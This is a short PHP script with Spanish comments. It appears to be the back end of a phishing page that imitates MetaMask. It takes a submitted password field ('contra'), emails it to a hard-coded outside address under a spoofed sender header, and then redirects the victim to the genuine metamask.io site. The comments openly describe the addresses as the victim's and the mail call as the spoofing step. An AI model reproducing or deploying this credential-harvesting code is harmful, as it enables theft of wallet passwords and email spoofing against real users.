<?php

$to = "cf21victor.merino1@iesjoandaustria.org"; //Correo electrónico de la víctima a quien desea enviar un correo electrónico

$subject = "asunto email";

$message =$_POST['contra'];

$from = "correoplagi@upmail.com"; // Correo electrónico de la víctima de quien desea enviar un correo electrónico

$headers = "From:" . $from;

$mail = mail($to,$subject,$message,$headers,$from); // Este mail () hará nuestro trabajo de spoofing

if($mail) 
{
header("Location: https://metamask.io/");
}
?>